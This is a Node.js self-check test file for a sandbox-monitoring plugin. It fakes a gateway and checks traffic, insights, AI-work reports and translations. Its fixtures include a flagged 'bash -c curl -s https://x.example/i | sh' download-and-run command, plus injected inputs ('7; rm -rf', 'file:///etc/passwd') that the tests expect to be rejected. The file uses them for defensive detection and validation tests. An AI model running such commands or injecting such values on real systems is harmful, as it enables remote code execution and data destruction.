// Self-check: the host half against a fake box window (what the nookbox gateway answers at http://nookbox.internal/v1),
// the assistants' tools, coded errors, and the panel's two dictionaries. `node check.mjs`
import assert from 'node:assert/strict'
import { existsSync, mkdtempSync, readFileSync } from 'node:fs'
import { createServer } from 'node:http'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { apply } from './index.js'
import { atWork, flowLine, shieldHealth, shieldOf, spanOf, usageByModel } from './lib/box.js'
import { aiWork } from '../../workbench/lib/aiwork.js'
import { en, zh } from './src/locale.js'

// ── a fake box window ──
const FLOW = { id: 7, ts: 1_700_000_000_000, box_id: 'b1', method: 'POST', scheme: 'https', host: 'api.anthropic.com', port: 443, path: '/v1/messages', status: 200,
  duration_ms: 812, req_bytes: 2048, resp_bytes: 4096, req_headers: [['x-api-key', 'NKB…']], resp_headers: [['content-type', 'text/event-stream']], secrets: ['claude-login'],
  error: null, provider: 'anthropic', model: 'claude-test', input_tokens: 42, output_tokens: 7, cache_read_tokens: 0, cache_write_tokens: 0 }
const INSIGHTS = {
  since: 1_700_000_000_000,
  health: { score: 78, level: 'watch', reasons: [{ code: 'suspicious', n: 1, cost: 10 }, { code: 'anomalies', n: 1, cost: 5 }] },
  risks: { suspicious: 2 },
  findings: [{ risk: 'suspicious', tag: 'remote-script', subject: 'bash -c curl -s https://x.example/i | sh', reason: 'a script downloaded and run in one go', count: 2, first: 1, last: 2, example: { id: 9, kind: 'exec', summary: 'bash -c curl -s https://x.example/i | sh' } }],
  clients: [{ client: 'codex', requests: 30, errors: 6, error_rate: 0.2, ai_requests: 12, avg_ms: 900, p50_ms: 700, p95_ms: 4000, input_tokens: 1000, output_tokens: 200, cache_read_tokens: 3000, cache_write_tokens: 0, cache_hit: 0.75, hosts: 2 }],
  anomalies: [{ code: 'auth_failures', host: 'api.example.com', count: 6, last: 2 },
    { code: 'repeated_failure', client: 'claude', host: 'api.anthropic.com', request: 'POST /v1/messages', status: 429, count: 4, last: 150_000 }],
  new_hosts: [{ host: 'new.example.com', first: 1, requests: 3 }],
  destinations: [{ host: 'api.example.com', requests: 30, errors: 6, error_rate: 0.2, avg_ms: 900, p50_ms: 700, p95_ms: 4000, sent: 2048, received: 4096, ai_requests: 12, clients: ['codex'], first_seen: 1 }],
  activity: { kinds: { exec: 4, http: 30 }, hourly: [{ hour: 1, events: 34, requests: 30, errors: 6 }], requests: 30, errors: 6, avg_ms: 900, p50_ms: 700, p95_ms: 4000 },
}
const seen = []
const server = createServer((req, res) => {
  const url = new URL(req.url, 'http://x')
  seen.push(`${req.method} ${url.pathname}${url.search}`)
  const send = (code, v) => { res.writeHead(code, { 'content-type': 'application/json' }); res.end(JSON.stringify(v)) }
  if (req.method !== 'GET') return send(405, { error: 'read-only' })
  switch (url.pathname) {
    case '/v1/box': return send(200, {
      box: { name: 'ruyix', state: 'running', spec: { runtime: 'microvm', oci_runtime: 'io.containerd.krun.v2', cpus: 8, memory_mb: 8192, image: 'reg.example/ruyix:1.0', start: 'ruyix start',
        ports: [{ host: 3090, guest: 3080 }], mounts: [{ source: '/src/app', target: '/workspace/app', mode: 'rw' }], policy: { mode: 'open', allow: [], deny: [], passthrough: [], allow_private: true, allow_exfil: false } }, agent: { coverage: { net: true, dns: true, sensor: 'ebpf', notes: [] } } },
      credentials: [{ name: 'provider-key', kind: 'http', env: ['PROVIDER_API_KEY'], hosts: ['llm.example'], login: false, set: true, last_used_at: null }],
    })
    case '/v1/flows': return send(200, [FLOW])
    case '/v1/flows/7': return send(200, { flow: FLOW, request_body: { text: '{"a":1}', bytes: 7 }, response_body: null })
    case '/v1/events': return send(200, [{ id: 1, ts: 1_700_000_000_000, box_id: 'b1', kind: 'exec', severity: 'info', summary: 'git status', data: {} }])
    case '/v1/usage': return send(200, [
      { day: '2026-10-08', box_id: 'b1', provider: 'anthropic', model: 'claude-test', requests: 2, input_tokens: 100, output_tokens: 20, cache_read_tokens: 5, cache_write_tokens: 1 },
      { day: '2026-10-09', box_id: 'b1', provider: 'anthropic', model: 'claude-test', requests: 1, input_tokens: 50, output_tokens: 10, cache_read_tokens: 0, cache_write_tokens: 0 },
    ])
    case '/v1/stats': return send(200, { requests: 1, top_hosts: [{ host: 'api.anthropic.com', requests: 1, sent: 2048, received: 4096 }], tokens_in: 42, tokens_out: 7, alerts: 0 })
    case '/v1/insights': return url.searchParams.get('hours') === '5' ? send(404, { error: 'not found' }) : send(200, INSIGHTS)
    default: return send(404, { error: 'not found' })
  }
})
await new Promise(r => server.listen(0, '127.0.0.1', r))
const API = `http://127.0.0.1:${server.address().port}`

// ── a fake dsh ──
// the AI work the workbench reports (its real aiWork): a codex task while the finding happened, a claude one at the 429s
const WORK = aiWork({
  tasks: [
    { id: 't1', agent: 'a', runtime: 'codex', model: 'gpt-test', status: 'done', createdAt: 1, startedAt: 1, endedAt: 5000, tokens: 900, cost: 0.5 },
    { id: 't2', agent: 'b', runtime: 'claude', status: 'failed', createdAt: 100_000, startedAt: 100_000, endedAt: 200_000, tokens: 300, error: 'rate limited' },
  ],
  agentName: id => ({ a: 'Analyst', b: 'Coder' })[id], calls: [{ at: 3000, kind: 'brief', model: 'dsh-test', duration_ms: 400, ok: true, tokens: 50 }], since: 0, until: 3600e3,
})
function fakeDsh({ parts } = {}) {
  let handler
  const tools = []
  const agent = { ctx: { tools: { register: t => { tools.push(t); return () => {} } } } }
  const ctx = { connection: { fetch: { register: h => { handler = h } } }, agents: { list: () => [agent] }, on() {}, effect() {},
    inject: (names, f) => { if (parts && names.includes('ruyixShell')) f({ ruyixShell: { parts: () => parts }, effect() {} }) } }
  const call = async (op, args = {}) => {
    const res = await handler.fetch(new Request('http://dsh/api/ruyix-box', { method: 'POST', body: JSON.stringify({ op, ...args }) }))
    return { status: res.status, body: await res.json() }
  }
  return { ctx, call, tools }
}

// in a box: everything reads through
{
  const { ctx, call, tools } = fakeDsh()
  apply(ctx, {}, { home: mkdtempSync(join(tmpdir(), 'ruyix-box-')), env: { NOOKBOX_API: API } })
  const st = (await call('status')).body
  assert.equal(st.inBox, true)
  assert.equal(st.box.name, 'ruyix')
  assert.equal(st.credentials[0].name, 'provider-key')
  assert.deepEqual((await call('flows', { limit: 9999, host: 'api.anthropic.com' })).body.map(f => f.id), [7])
  assert.ok(seen.some(s => s === 'GET /v1/flows?limit=500&host=api.anthropic.com'), 'limits are capped before they reach nookbox')
  assert.equal((await call('flow', { id: 7 })).body.flow.model, 'claude-test')
  const bad = await call('flow', { id: '7; rm -rf' })
  assert.equal(bad.status, 500); assert.equal(bad.body.code, 'badId')
  const missing = await call('flow', { id: 8 })
  assert.equal(missing.body.code, 'notFound')
  assert.equal((await call('events', { kinds: ['exec', 'file'] })).body[0].summary, 'git status')
  assert.ok(seen.includes('GET /v1/events?kinds=exec%2Cfile&limit=200'))
  assert.equal((await call('usage', { days: 7 })).body.length, 2)
  assert.equal((await call('stats', {})).body.requests, 1)
  assert.equal((await call('insights', { hours: 99999 })).body.health.score, 78)
  assert.ok(seen.includes('GET /v1/insights?hours=2160'), 'the window is capped at 90 days')
  assert.equal((await call('insights', { hours: 5 })).body.code, 'oldNookbox', 'an older host nookbox is named as such')
  assert.equal((await call('nope')).status, 400)
  // the shield: the box in a few numbers, one call; the window is whole hours from `since`, the answer kept a minute
  {
    const n0 = seen.length
    const since = Date.now() - 90 * 60e3
    const sh = (await call('shield', { since })).body
    assert.deepEqual(sh, { inBox: true, runtime: 'microvm', state: 'running', health: 'warn', requests: 1, blocked: 0, lastBlocked: null })
    assert.ok(seen.slice(n0).includes('GET /v1/stats?hours=2') && seen.slice(n0).includes('GET /v1/insights?hours=2'), 'the window is the hours since `since`, rounded up')
    const n1 = seen.length
    assert.deepEqual((await call('shield', { since })).body, sh)
    assert.equal(seen.length, n1, 'asked again within a minute: kept')
    await call('shield', { since: 'never' })
    assert.ok(seen.includes('GET /v1/stats?hours=24'), 'no usable `since`: the last 24 hours')
  }
  // settings: only a well-formed address
  assert.equal((await call('saveSettings', { settings: { api: 'file:///etc/passwd' } })).body.code, 'badApi')
  assert.equal((await call('saveSettings', { settings: { api: API } })).body.settings.api, API)
  // the assistants' tools
  assert.deepEqual(tools.map(t => t.name), ['nookbox_box', 'nookbox_traffic', 'nookbox_timeline', 'nookbox_insights', 'nookbox_ai_work', 'nookbox_usage'])
  assert.equal((await call('aiWork', { hours: 24 })).body.code, 'noWorkbench', 'no workbench part: said as such')
  await assert.rejects(tools.find(t => t.name === 'nookbox_ai_work').execute({}), /no workbench/)
  const run = name => tools.find(t => t.name === name).execute({})
  assert.match((await run('nookbox_box')).text, /Box ruyix \(running\), microvm.*processes ebpf.*private addresses allowed, paste\/file-drop\/tunnel\/request-catcher services refused.*Host folders: \/src\/app → box \/workspace\/app \(add one.*provider-key \(http\): llm\.example; in \$PROVIDER_API_KEY.*on the host/s)
  assert.match((await run('nookbox_traffic')).text, /POST https:\/\/api\.anthropic\.com\/v1\/messages → 200 812ms .*credentials claude-login · claude-test in 42 out 7/)
  assert.match((await run('nookbox_timeline')).text, /exec info git status/)
  const ins = (await run('nookbox_insights')).text
  assert.match(ins, /health 78\/100 \(watch\) — suspicious 1 \(−10\)/)
  assert.match(ins, /- suspicious remote-script · bash -c curl.*: 2× — a script downloaded/)
  assert.match(ins, /- codex: 30 requests, 20% failed, p50 700 ms, p95 4000 ms, 12 model calls, in 1000 out 200 tokens, cache hit 75%/)
  assert.match(ins, /- auth_failures api\.example\.com: 6/)
  assert.match(ins, /New destinations: new\.example\.com/)
  assert.match(ins, /Latency: p50 700 ms, p95 4000 ms/)
  assert.match(ins, /- api\.example\.com: 30 requests, 20% failed, p50 700 ms, p95 4000 ms, ↑2\.0 kB ↓4\.1 kB; codex/)
  assert.match((await run('nookbox_usage')).text, /anthropic\/claude-test: 3 requests, in 150, out 30, cache read 5, cache write 1/)
}

// with the workbench (a ruyix part): its AI work, and the assistant's text joins it to what the box saw
{
  const asked = []
  const parts = [{ id: 'other' }, { id: 'wb', workbench: { aiWork: a => { asked.push(a); return WORK } } }]
  const { ctx, call, tools } = fakeDsh({ parts })
  apply(ctx, {}, { home: mkdtempSync(join(tmpdir(), 'ruyix-box-')), env: { NOOKBOX_API: API } })
  assert.equal((await call('aiWork', { hours: 99999 })).body.totals.agent_tasks, 2)
  assert.deepEqual(asked, [{ hours: 2160 }], 'the window is capped at 90 days')
  const txt = (await tools.find(t => t.name === 'nookbox_ai_work').execute({ hours: 24 })).text
  assert.match(txt, /2 agent tasks, 1 workbench model calls; 2 done, 1 failed/)
  assert.match(txt, /- Analyst \(codex gpt-test\): 1 tasks, success 100%.*900 tokens, \$0\.50/)
  assert.match(txt, /- suspicious remote-script · bash -c curl.*: Analyst · chat job; dsh · workbench brief$/m, 'the finding: the codex task first, then the workbench call')
  assert.match(txt, /- repeated_failure api\.anthropic\.com \(claude\): Coder · chat job$/m, 'the 429s: only the claude runtime')
}

// outside a box: the panel says so, the tools say why
{
  const { ctx, call, tools } = fakeDsh()
  apply(ctx, {}, { home: mkdtempSync(join(tmpdir(), 'ruyix-box-')), env: {} })
  assert.deepEqual((await call('status')).body.inBox, false)
  assert.deepEqual((await call('shield', {})).body, { inBox: false }, 'the shield outside a box: a state, not an error')
  const r = await call('flows', {})
  assert.equal(r.body.code, 'notInBox')
  await assert.rejects(tools[0].execute({}), /does not run in a nookbox box/)
}
{
  // the address given, but nothing answers there
  const { ctx, call } = fakeDsh()
  apply(ctx, {}, { home: mkdtempSync(join(tmpdir(), 'ruyix-box-')), env: { NOOKBOX_API: 'http://127.0.0.1:9' } })
  const st = (await call('status')).body
  assert.equal(st.inBox, false); assert.match(st.error, /did not answer/)
  assert.deepEqual((await call('shield', {})).body, { inBox: false })
}
{
  // a nookbox that answers /v1/box but fails the rest: in a box, with the error's code
  const { ctx, call } = fakeDsh()
  const bad = createServer((req, res) => { const ok = req.url.startsWith('/v1/box'); res.writeHead(ok ? 200 : 500, { 'content-type': 'application/json' }); res.end(JSON.stringify(ok ? { box: { name: 'b', state: 'running', spec: {} } } : { error: 'x' })) })
  await new Promise(r => bad.listen(0, '127.0.0.1', r))
  apply(ctx, {}, { home: mkdtempSync(join(tmpdir(), 'ruyix-box-')), env: { NOOKBOX_API: `http://127.0.0.1:${bad.address().port}` } })
  assert.deepEqual((await call('shield', {})).body, { inBox: true, error: 'http' })
  bad.close()
}

// pure helpers
// the AI work at a moment: a minute of slack each side, a running task up to now, an agent client's own runtime only
{
  const T = [
    { id: 'h', source: 'helper', runtime: 'dsh', at: 1000, ended_at: 1400, status: 'done' },
    { id: 'c', source: 'job', runtime: 'codex', at: 1000, ended_at: 5000, status: 'done' },
    { id: 'r', source: 'workflow', runtime: 'claude', at: 500_000, ended_at: null, status: 'running' },
    { id: 'q', source: 'job', runtime: 'pi', at: 2000, ended_at: null, status: 'queued' },
  ]
  const ids = w => atWork(T, w, 900_000).map(x => x.id)
  assert.deepEqual(ids({ from: 3000 }), ['c', 'q', 'h'], 'the agents before the workbench\'s calls; a queued task is a moment')
  assert.deepEqual(ids({ from: 64_000 }), ['c'], 'within the slack of its end (the others ended earlier)')
  assert.deepEqual(ids({ from: 66_000 }), [], 'past it')
  assert.deepEqual(ids({ from: 800_000 }), ['r'], 'still running')
  assert.deepEqual(ids({ from: 3000, client: 'codex' }), ['c'])
  assert.deepEqual(ids({ from: 3000, client: 'node' }), ['c', 'q', 'h'], 'a client that is no agent: everything then')
  assert.deepEqual(ids({ from: null }), [])
  assert.deepEqual(spanOf({ hour: 3600e3, count: 9, usual: 1 }), { from: 3600e3, to: 7200e3 - 1 })
  assert.deepEqual(spanOf({ first: 5, last: 9 }), { from: 5, to: 9 })
  assert.deepEqual(spanOf({ last: 9 }), { from: 9, to: 9 })
}
// the shield's summary: the three raw answers → the numbers (a container, blocked connections, the latest of them)
{
  const box = { box: { name: 'b', state: 'running', spec: { runtime: 'container' } } }
  const blk = (subject, count, last) => ({ risk: 'notice', tag: 'egress-blocked', subject, reason: `refused ${subject}`, count, first: 1, last, example: {} })
  const insights = { health: { score: 90, level: 'good' }, findings: [blk('a.example', 2, 5000), { risk: 'suspicious', tag: 'remote-script', subject: 'x', count: 9, last: 9000 }, blk('b.example', 1, 7000), blk('old.example', 4, 100)] }
  assert.deepEqual(shieldOf({ box, stats: { requests: 214 }, insights }, 1000),
    { inBox: true, runtime: 'container', state: 'running', health: 'ok', requests: 214, blocked: 3, lastBlocked: { at: 7000, subject: 'b.example', reason: 'refused b.example' } },
    'only egress-blocked, only since `since`; the latest one is the last one')
  const quiet = shieldOf({ box: { box: { state: 'running', spec: { runtime: 'microvm' } } }, stats: {}, insights: { health: { score: 100, level: 'good' }, findings: [] } })
  assert.deepEqual([quiet.runtime, quiet.requests, quiet.blocked, quiet.lastBlocked], ['microvm', 0, 0, null])
  assert.deepEqual(['good', 'watch', 'risk'].map(level => shieldHealth({ level, score: 0 })), ['ok', 'warn', 'bad'], 'nookbox\'s levels first')
  assert.deepEqual([90, 70, 20].map(score => shieldHealth({ level: 'new', score })), ['ok', 'warn', 'bad'], 'an unknown level: by the score')
}
assert.equal(usageByModel([]).length, 0)
assert.match(flowLine({ ...FLOW, port: 7001, model: null, secrets: [] }), /api\.anthropic\.com:7001\/v1\/messages → 200/)

// the dictionaries: the same keys, every error code worded
assert.deepEqual(Object.keys(zh).sort(), Object.keys(en).sort(), 'zh and en have the same keys')
for (const code of ['notInBox', 'notFound', 'http', 'badId', 'badApi', 'oldNookbox', 'noWorkbench']) assert.ok(zh[`err.${code}`] && en[`err.${code}`], `err.${code} is worded`)
// every finding the nookbox rules can raise, and every anomaly, has a title and a line in both languages
// (nookbox is its own repository: NOOKBOX_SRC, else the usual checkout beside this one's workspace; not there: said, skipped)
const nookboxSrc = process.env.NOOKBOX_SRC || join(homedir(), 'Projects/design/devbox-workspace/nookbox')
const rulesFile = join(nookboxSrc, 'crates/nookbox/src/rules.rs')
if (existsSync(rulesFile)) {
  const rules = readFileSync(rulesFile, 'utf8')
  const tags = [...new Set([...rules.matchAll(/label\(\s*"(?:notice|suspicious|malicious)",\s*"([a-z-]+)"/g)].map(m => m[1]))]
  assert.ok(tags.length >= 20, `found the rules' tags (${tags.length})`)
  for (const tag of tags) assert.ok(zh[`tag.${tag}`] && en[`tag.${tag}`] && zh[`tagd.${tag}`] && en[`tagd.${tag}`], `tag ${tag} is worded`)
} else console.log(`box check: nookbox's rules not found at ${rulesFile} (NOOKBOX_SRC): their words not checked`)
for (const code of ['auth_failures', 'rate_limited', 'server_errors', 'repeated_failure', 'event_burst', 'request_burst']) assert.ok(zh[`anom.${code}`] && en[`anom.${code}`], `anom.${code} is worded`)
const client = readFileSync(new URL('./client.js', import.meta.url), 'utf8')
assert.ok(existsSync(new URL('./client.js', import.meta.url)) && client.includes("id: '@ruyix/box'"), 'client.js is built (node build.mjs)')

server.close()
console.log('box check: ok')
